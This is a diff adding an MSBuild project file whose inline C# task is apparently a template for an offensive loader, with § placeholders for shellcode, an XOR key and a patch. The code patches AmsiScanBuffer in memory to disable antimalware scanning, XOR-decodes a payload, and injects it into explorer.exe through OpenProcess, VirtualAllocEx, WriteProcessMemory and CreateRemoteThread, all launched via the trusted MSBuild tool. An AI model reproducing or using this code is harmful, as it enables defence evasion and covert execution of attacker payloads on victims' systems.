@@ -1,0 +1,93 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Beholder">
+   <Purbol/>
+  </Target>
+   <UsingTask
+    TaskName="Purbol"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Reference Include="System.Management.Automation" />    
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+using System.Runtime.InteropServices;
+public class Purbol : Task, ITask {
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);    
+        
+    public override bool Execute() {
+        byte[] §buf§ = new byte[] { §SHELLCODE§ };
+        byte[] §xor_key§ = new byte[] { §KEY§ };
+        byte[] §patch§ = { §AMSI_PATCH§ };
+        byte[] §patch_encoded§ = new byte[§patch§.Length];
+        for (int i = 0; i < §patch§.Length; i++)
+        {
+            §patch_encoded§[i] = (byte)(((uint)§patch§[i]) ^ §xor_key§[i % §xor_key§.Length]);
+        }
+        
+        var §lib§ = LoadLibrary("amsi.dll");
+        var §addr_amsi§ = GetProcAddress(§lib§, "Amsi" + "Scan" + "Buffer");
+
+        uint §oldProtect§;
+        VirtualProtect(§addr_amsi§, (UIntPtr)§patch_encoded§.Length, 0x08, out §oldProtect§);
+        Marshal.Copy(§patch_encoded§, 0, §addr_amsi§, §patch_encoded§.Length);
+        VirtualProtect(§addr_amsi§, (UIntPtr)§patch_encoded§.Length, 0x20, out §oldProtect§);
+        
+        int size = §buf§.Length;
+
+        byte[] §buf_decoded§ = new byte[size];
+        for (int i = 0; i < size; i++)
+        {
+            §buf_decoded§[i] = (byte)(((uint)§buf§[i]) ^ §xor_key§[i % §xor_key§.Length]);
+        }
+
+        Process[] §localByName§;
+        §localByName§ = Process.GetProcessesByName("explorer");
+        if(§localByName§.Length == 0)
+        {
+            Environment.Exit(1);    
+        }
+            
+        IntPtr §hProcess§ = OpenProcess(0x001F0FFF, false, §localByName§[0].Id);
+        IntPtr §addr§ = VirtualAllocEx(§hProcess§, IntPtr.Zero, 512000, 0x3000, 0x40);
+        IntPtr §outSize§;
+
+        WriteProcessMemory(§hProcess§, §addr§, §buf_decoded§, §buf_decoded§.Length, out §outSize§);
+        IntPtr §hThread§ = CreateRemoteThread(§hProcess§, IntPtr.Zero, 0, §addr§, IntPtr.Zero, 0, IntPtr.Zero);
+
+        return true;
+    }
+
+}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
